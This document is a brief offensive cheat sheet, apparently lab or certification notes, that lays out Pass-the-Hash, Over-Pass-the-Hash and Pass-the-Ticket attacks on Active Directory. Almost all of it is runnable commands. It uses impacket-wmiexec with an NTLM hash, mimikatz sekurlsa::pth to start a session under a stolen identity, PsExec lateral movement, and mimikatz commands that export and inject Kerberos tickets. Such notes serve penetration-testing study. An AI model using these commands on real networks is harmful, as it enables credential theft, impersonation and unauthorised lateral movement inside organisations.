# Pass / Over-Pass / Pass-the-Ticket

## Pass the Hash (AD Context)

Works for both local Administrator and domain accounts (needs SMB port 445 + ADMIN$ share).

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

---

## Over-Pass the Hash

Convert an NTLM hash into a Kerberos TGT to avoid NTLM and enable Kerberos-based lateral movement.

```cmd
# Create new PowerShell session running as the hashed user's identity
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:<hash> /run:powershell
```

In the new session, trigger an interactive login to cache a TGT:
```cmd
net use \\files04
klist              # verify TGT is cached
.\PsExec.exe \\web04 cmd.exe   # no password needed
```

---

## Pass the Ticket

Export TGS/TGT tickets from memory and inject them into another session to access services as that user.

```cmd
# Export all tickets to .kirbi files
privilege::debug
sekurlsa::tickets /export

# Inspect tickets
dir *.kirbi

# Inject a specific ticket
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

# Verify
klist
```

> Select the correct ticket for the target service (e.g., `cifs-web04` for SMB share on web04). Run cmd/ps that uses the ticket with the same admin privileges as mimikatz.
